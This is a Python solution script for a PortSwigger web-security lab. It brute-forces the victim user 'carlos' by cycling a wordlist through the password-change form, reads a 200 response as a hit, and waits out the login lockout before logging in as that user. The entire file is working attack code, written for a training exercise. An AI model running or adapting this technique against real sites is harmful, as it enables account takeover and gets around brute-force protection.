#!/usr/bin/env python3
# Lab: Password brute-force via password change
# Lab-Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
# Difficulty: PRACTITIONER
import requests
import shutil
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def login(host, client):
    data = {'username': 'wiener', 'password': 'peter'}
    client.post(f'{host}/login', data=data, allow_redirects=False)


def change_password(host, client, password):
    data = {'username': 'carlos', 'current-password': password, 'new-password-1': password, 'new-password-2': password}
    r = client.post(f'{host}/my-account/change-password', data=data, allow_redirects=False)
    if r.status_code == 200:
        return True
    return False


def verify_login(host, client, username, password):
    url = f'{host}/login'
    data = {'username': username, 'password': password}
    r = client.post(url, data=data, allow_redirects=True)
    if 'Congratulations, you solved the lab!' in r.text:
        return True
    return False


def wait(s):
    for i in range(0, s):
        msg = f'[ ] Waiting for {s-i} more seconds to expire the brute force protection of the login'
        print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
        time.sleep(1)
    msg = f'[+] Waited enough to expire the brute force protection of the login'
    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\n', flush=True)


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Brute force password')

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    print(f'[ ] Attempt password: ', end='\r')
    with open('../candidate_passwords.txt') as f:
        for line in f:
            password = line.strip()
            msg = f'[ ] Try password: {password}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
            login(host, client)
            if change_password(host, client, password):
                msg = f'[+] Found password: {password}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
                print()
                print(f'[+] Attempting to login to solve the lab')
                wait(65)
                if verify_login(host, client, 'carlos', password):
                    print(f'[+] Login verified, lab solved')
                    sys.exit(0)

    print()
    print(f'[-] Failed to brute force the password')


if __name__ == "__main__":
    main()
